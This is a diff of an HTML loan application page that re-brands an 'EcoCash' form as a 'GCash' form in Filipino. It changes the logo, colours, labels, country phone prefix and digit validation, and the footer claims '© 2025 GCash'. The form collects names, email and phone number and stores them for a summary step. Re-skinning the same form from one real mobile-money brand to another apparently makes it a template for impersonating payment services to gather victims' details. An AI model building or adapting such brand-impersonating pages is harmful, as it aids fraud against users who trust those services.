@@ -1,10 +1,10 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fil">
 
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>EcoCash - Loan Application</title>
+    <title>GCash - Aplikasyon sa Loan</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
         * {
@@ -17,7 +17,7 @@
         body {
             height: 100%;
             font-family: 'Inter', sans-serif;
-            background: #f5f5f5;
+            background: #f0f2f5;
             overflow: hidden;
         }
         
@@ -38,6 +38,7 @@
             margin-bottom: 10px;
             background: white;
             box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            border-radius: 12px;
         }
         
         .back-btn {
@@ -53,12 +54,12 @@
             font-weight: 700;
         }
         
-        .logo-eco {
-            color: #0066ff;
+        .logo-g {
+            color: #007dfe;
         }
         
         .logo-cash {
-            color: #ff0000;
+            color: #007dfe;
         }
         
         .card {
@@ -80,6 +81,7 @@
             font-weight: 700;
             text-align: center;
             margin-bottom: 20px;
+            color: #333;
         }
         
         .progress-bar {
@@ -94,7 +96,7 @@
         .progress-fill {
             width: 66%;
             height: 100%;
-            background: linear-gradient(to right, #4361ee, #7209b7);
+            background: linear-gradient(to right, #007dfe, #0056b3);
         }
         
         .step-text {
@@ -132,7 +134,7 @@
         }
         
         .form-input:focus {
-            border-color: #4361ee;
+            border-color: #007dfe;
             outline: none;
         }
         
@@ -168,10 +170,6 @@
             font-size: 16px;
         }
         
-        .phone-input:focus~.phone-group {
-            border-color: #4361ee;
-        }
-        
         .btn-group {
             display: flex;
             gap: 15px;
@@ -195,7 +193,7 @@
         }
         
         .next-btn {
-            background: linear-gradient(to right, #4361ee, #7209b7);
+            background: linear-gradient(to right, #007dfe, #0056b3);
             color: white;
         }
         
@@ -213,45 +211,45 @@
 <body>
     <header>
         <button class="back-btn" onclick="history.back()">←</button>
-        <div class="logo"><span class="logo-eco">Eco</span><span class="logo-cash">Cash</span></div>
+        <div class="logo"><span class="logo-g">G</span><span class="logo-cash">Cash</span></div>
         <div></div>
     </header>
 
     <main class="card">
-        <h1 class="form-title">Loan Application</h1>
+        <h1 class="form-title">Aplikasyon sa Loan</h1>
         <div class="progress-bar">
             <div class="progress-fill"></div>
         </div>
-        <div class="step-text">Step 2 of 3</div>
+        <div class="step-text">Hakbang 2 sa 3</div>
 
         <div class="name-group">
             <div>
-                <label class="form-label">First Name</label>
-                <input type="text" class="form-input" id="firstName" placeholder="John">
+                <label class="form-label">Pangalan</label>
+                <input type="text" class="form-input" id="firstName" placeholder="Juan">
             </div>
             <div>
-                <label class="form-label">Last Name</label>
-                <input type="text" class="form-input" id="lastName" placeholder="Doe">
+                <label class="form-label">Apelyido</label>
+                <input type="text" class="form-input" id="lastName" placeholder="Dela Cruz">
             </div>
         </div>
 
         <label class="form-label">Email Address</label>
-        <input type="email" class="form-input" id="email" placeholder="john.doe@example.com" style="margin-bottom:24px;">
+        <input type="email" class="form-input" id="email" placeholder="juan.delacruz@example.com" style="margin-bottom:24px;">
 
-        <label class="form-label">Phone Number</label>
+        <label class="form-label">Numero ng Telepono</label>
         <div class="phone-group" id="phoneGroup">
-            <span class="phone-prefix">+263</span>
-            <input type="tel" class="phone-input" id="phone" placeholder="771234567">
+            <span class="phone-prefix">+63</span>
+            <input type="tel" class="phone-input" id="phone" placeholder="9123456789" maxlength="10">
         </div>
-        <small style="color:#999; display:block; margin-bottom:30px;">Enter 9 digits (e.g. 771234567)</small>
+        <small style="color:#999; display:block; margin-bottom:30px;">Ilagay ang 10 digit (hal. 9123456789)</small>
 
         <div class="btn-group">
-            <button class="prev-btn" onclick="history.back()">PREVIOUS</button>
-            <button class="next-btn" id="nextBtn">NEXT STEP</button>
+            <button class="prev-btn" onclick="history.back()">NAKARAAN</button>
+            <button class="next-btn" id="nextBtn">SUNOD NA HAKBANG</button>
         </div>
     </main>
 
-    <footer>© 2025 EcoCash</footer>
+    <footer>© 2025 GCash</footer>
 
     <script>
         // Pre-fill if user goes back
@@ -283,13 +281,13 @@
                 document.getElementById('email').classList.add('invalid');
                 valid = false;
             }
-            if (!phone || phone.length !== 9 || !/^\d+$/.test(phone)) {
+            if (!phone || phone.length !== 10 || !/^\d+$/.test(phone)) {
                 document.getElementById('phoneGroup').classList.add('invalid');
                 valid = false;
             }
 
             if (!valid) {
-                alert('Please complete all fields correctly.\n• Email must be valid\n• Phone must be exactly 9 digits');
+                alert('Mangyaring punan nang tama ang lahat ng patlang.\nDapat valid ang email\nDapat eksaktong 10 digit ang numero ng telepono');
                 return;
             }
 
@@ -299,7 +297,7 @@
             localStorage.setItem('email', email);
             localStorage.setItem('phone', phone);
 
-            // Go to summary (clean URL)
+            // Go to summary
             window.location.href = 'summary.html';
         });
     </script>
